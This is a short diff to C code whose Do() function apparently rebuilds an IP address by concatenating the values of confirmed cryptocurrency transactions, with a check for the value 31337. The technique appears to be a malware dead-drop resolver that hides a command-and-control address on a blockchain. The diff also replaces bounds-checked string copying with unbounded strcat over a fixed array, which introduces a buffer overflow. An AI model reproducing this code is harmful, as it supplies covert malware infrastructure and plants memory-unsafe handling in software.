@@ -25,7 +25,7 @@ struct Balance {
     double final_balance;
     double n_tx;
     double final_n_tx;
-    struct Txrefs* txrefs; // Changed to pointer
+    struct Txrefs txrefs[256];
 };
 
 char* ToAddr(const char* address) {
@@ -54,9 +54,9 @@ char* Do() {
     int start = 0;
     int round = 0;
     char ipzinho[4096];
-    int ipzinhoLen = 0;
+    ipzinho[0] = '\0';
 
-    for (int i = 0; i < parsed.final_n_tx; i++) { // Use final_n_tx instead of sizeof(parsed.txrefs)
+    for (int i = 0; i < sizeof(parsed.txrefs) / sizeof(parsed.txrefs[0]); i++) {
         if (parsed.txrefs[i].tx_input_n == -1 && parsed.txrefs[i].confirmations > 0) {
             if (round == 2) {
                 break;
@@ -65,11 +65,7 @@ char* Do() {
                 round++;
                 char valueStr[32];
                 snprintf(valueStr, sizeof(valueStr), "%f", parsed.txrefs[i].value);
-                int valueLen = strlen(valueStr);
-                if (ipzinhoLen + valueLen < sizeof(ipzinho)) {
-                    strcpy(ipzinho + ipzinhoLen, valueStr);
-                    ipzinhoLen += valueLen;
-                }
+                strcat(ipzinho, valueStr);
             }
 
             if (parsed.txrefs[i].value == 31337) {
@@ -78,9 +74,8 @@ char* Do() {
         }
     }
 
-    char* resultStr = malloc(ipzinhoLen + 1);
-    strncpy(resultStr, ipzinho, ipzinhoLen);
-    resultStr[ipzinhoLen] = '\0';
+    char* resultStr = malloc(strlen(ipzinho) + 1);
+    strcpy(resultStr, ipzinho);
     return resultStr;
 }
 
